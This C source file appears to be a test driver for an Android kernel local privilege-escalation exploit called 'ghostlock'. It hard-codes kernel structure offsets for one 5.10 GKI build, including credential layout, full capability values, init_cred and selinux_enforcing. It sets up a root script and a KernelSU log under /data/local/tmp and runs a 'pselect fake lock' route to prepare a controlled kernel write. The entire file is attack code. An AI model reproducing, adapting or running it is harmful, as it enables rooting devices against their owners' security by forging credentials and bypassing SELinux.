#include "glk_session.h"
#include "glk43499_api.h"
#include "../kernels/offsets.h"
#include "../../general/gl_log.h"

#include <pthread.h>
#include <stdio.h>
#include <string.h>

void *consumer_thread(void *arg);

#define TEMP_RELEASE "5.10.252-gki-gabcbe4b2bc10"
#define TEMP_HOME "/data/local/tmp"
#define TEST_TARGET 0x1000ULL

/* Minimal 5.10 select-route probe profile; no native profile table. */
static const struct kernel_offsets fixed_510 = {
    .uname_r = TEMP_RELEASE,
    .kernel_major = 5,
    .requires_shizuku = 1,
    .kernel_phys_load = 0xa8000000ULL,
    .pselect_waiter_shift = 0,
    .mcast_waiter_off = 0,
    .compact_waiter = 0,
    .mm_struct_sz = 960,
    .kernelsnitch_collisions = 8,
    .task_prio = 132,
    .task_normal_prio = 140,
    .task_sched_task_group = 784,
    .task_pi_lock = 2156,
    .task_pi_waiters = 2176,
    .task_pi_top_task = 2192,
    .task_pi_blocked_on = 2200,
    .task_pid = 1480,
    .task_tgid = 1484,
    .task_atomic_flags = 1424,
    .task_real_cred = 1912,
    .task_cred = 1920,
    .task_comm = 1936,
    .task_tasks = 1224,
    .task_seccomp = 2120,
    .cred_copy_size = 176,
    .cred_usage_value = 256,
    .cred_caps_offset = 48,
    .cred_caps_count = 3,
    .cred_caps_value = 0x1ffffffffffULL,
    .cred_ref_count = 3,
    .cred_ref0_offset = 128,
    .cred_ref1_offset = 136,
    .cred_ref2_offset = 144,
    .cred_ref0_image = 0xffffffc00a5af108ULL,
    .cred_ref1_image = 0xffffffc00a70bf90ULL,
    .cred_ref2_image = 0xffffffc00a5af100ULL,
    .off_init_task = 40542656,
    .off_init_cred = 40365808,
    .off_empty_zero_page = 41488384,
    .off_mcast_fake_bss = 41810296,
    .off_root_task_group = 41507584,
    .off_selinux_enforcing = 41846440,
    .off_selinux_blob_sizes = 35153680,
    .off_security_hook_heads = 35153704,
    .off_slide_nfulnl_logger = 39389696,
    .off_slide_boot_id = 41959753,
    .off_slide_loggers_0_1 = 39389472,
};

static int fixed_target(Glk43499Target *target) {
  glk43499_target_init(target, &fixed_510, TEMP_RELEASE);
  target->layout.init_cred_image =
      target->layout.kimage_text_base + target->offsets.off_init_cred;
  target->layout.p0_kernel_phys_load = fixed_510.kernel_phys_load;
  return 0;
}

static void fixed_config(Glk43499Config *config) {
  memset(config, 0, sizeof(*config));
  glk43499_config_defaults(config);
  config->main_cpu = 0;
  config->consumer_cpu = 1;
  config->route = GLK_ROUTE_PSELECT;
  snprintf(config->home, sizeof(config->home), "%s", TEMP_HOME);
  snprintf(config->root_script, sizeof(config->root_script),
           "%s/.ghostlock_root.sh", TEMP_HOME);
  snprintf(config->ksu_log, sizeof(config->ksu_log),
           "%s/.ghostlock_ksu.log", TEMP_HOME);
}

static Glk43499Handle *temp_jni_create(void) {
  Glk43499Target target;
  Glk43499Config config;
  Glk43499Env env;
  memset(&target, 0, sizeof(target));
  memset(&env, 0, sizeof(env));
  fixed_target(&target);
  fixed_config(&config);
  return glk43499_handle_create(&target, &config, &env);
}

static int temp_jni_select_probe(Glk43499Handle *handle) {
  Glk43499Session *s = glk43499_handle_session(handle);
  if (!s) return -1;
  GlkWriteRequest req = {
      .target = TEST_TARGET,
      .value = 0,
      .mode = 1,
      .preserve_child = 0,
      .label = "select-probe",
  };
  uintptr_t page = prepare_good_kernel_page(s, &req);
  if (!page) {
    pr_warning("select probe page prepare failed step=%d errno=%d\n",
               s->rt.route_last_step, s->rt.route_last_errno);
    return 2;
  }
  s->rt.page_base = page;
  setenv("GHOSTLOCK_TCP_ROUTE", "0", 1);
  pthread_t consumer;
  if (pthread_create(&consumer, NULL, consumer_thread, s) != 0) return 4;
  do_pselect_fake_lock_route(s, &req);
  atomic_store(&s->rt.punch_consume_stop, 1);
  pthread_join(consumer, NULL);
  pr_info("select probe done step=%d errno=%d calls=%d success=%d\n",
          s->rt.route_last_step, s->rt.route_last_errno,
          atomic_load(&s->rt.consumer_calls),
          atomic_load(&s->rt.consumer_success));
  return s->rt.route_last_step == 0 ? 0 : 3;
}

int main(void) {
  set_unbuffer();
  gl_log_set_min_level(GL_LOG_DEBUG);
  Glk43499Handle *handle = temp_jni_create();
  if (!handle) return 1;
  int rc = temp_jni_select_probe(handle);
  glk43499_handle_destroy(handle);
  return rc;
}
